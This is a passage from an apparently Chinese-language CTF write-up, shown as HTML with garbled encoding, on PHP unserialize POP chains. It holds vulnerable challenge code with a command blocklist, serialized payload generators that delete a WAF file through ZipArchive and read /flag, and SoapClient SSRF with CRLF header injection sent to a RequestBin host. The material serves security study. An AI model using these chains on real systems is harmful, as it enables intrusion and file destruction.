class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>popé“¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Game</span>::<span class="variable constant_">wakeup</span>-&gt;login::<span class="variable constant_">checking</span>-&gt;<span class="title class_">Open</span>::<span class="variable constant_">open</span></span><br></pre></td></tr></table></figure><p>å…ˆè¯»<strong>shell.php</strong>é‡Œçš„å†…å®¹</p><p><code>if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)</code>md5è§£å‡ºæ¥å°±æ˜¯admin</p><p><strong>payload1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<strong>shell.php</strong>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;                                                  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure><p>å†ç»“åˆopenç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;    </span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿…é¡»è¦ä¸å­˜åœ¨waf.txtï¼Œæ‰å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œå°±åªèƒ½ä½¿ç”¨ZipArchive ç±»è°ƒç”¨ä»–çš„openæ–¹æ³•æ¥å°†waf.txtç»™åˆ é™¤</p><p>å³æ„é€ <code>ZipArchive::open(waf.txt, ZipArchive::OVERWRITE)</code></p><p><strong>payload2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;content = <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåå³å¯åˆ é™¤waf.txt,ç”±äºshell.phpä¸­è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä½¿ç”¨<code>n\l /flag</code>è¯»å–</p><p><strong>payload3</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>=<span class="string">&#x27;n\l /flag&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClient-ç±»è¿›è¡Œ-SSRF"><a href="#SoapClient-ç±»è¿›è¡Œ-SSRF" class="headerlink" title="SoapClient ç±»è¿›è¡Œ SSRF"></a>SoapClient ç±»è¿›è¡Œ SSRF</h2><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041112652.png" alt="image-20221004111236510"></p><p>æœ€ä¸»è¦çš„æ˜¯è¿™ä¸ªç±»é‡Œå¸¦æœ‰ä¸€ä¸ª<code>__call</code>æ–¹æ³•ï¼Œå½“<code>__call</code> æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚,æ­£æ˜¯è¿™ä¸ª __call æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚</p><p>soapç±»çš„æ„é€ å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient::SoapClient(mixed $wsdl [ï¼Œarray $options ])</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›åœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œuriæ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨äº†è§£å®Œå‚æ•°ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨è¯¥ç±»æ¥è¿›è¡Œssrfäº†</p><p>é¦–å…ˆç›‘å¬ä¸€ä¸ªç½‘ç«™ï¼Œè¿™é‡Œç”¨çš„æ˜¯<a href="https://requestbin.io/">RequestBin</a></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041117986.png" alt="image-20221004111710824"></p><p><strong>test1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;This is a ssrf test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œtest.phpå</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041120612.png" alt="image-20221004112010496"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸè¿›è¡Œäº†ssrf</p><p>é…åˆCRLFå¯ä»¥æ’å…¥ä»»æ„HTTPå¤´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CRLF æŒ‡çš„æ˜¯å›è½¦ç¬¦(CRï¼ŒASCII 13ï¼Œ\rï¼Œ%0d) å’Œæ¢è¡Œç¬¦(LFï¼ŒASCII 10ï¼Œ\nï¼Œ%0a)ã€‚CRLFæ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ã€‚</span><br></pre></td></tr></table></figure><p><strong>test2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;https://requestbin.io/12lhej01&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;test\r\nCookie: PHPSESSID=test&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span 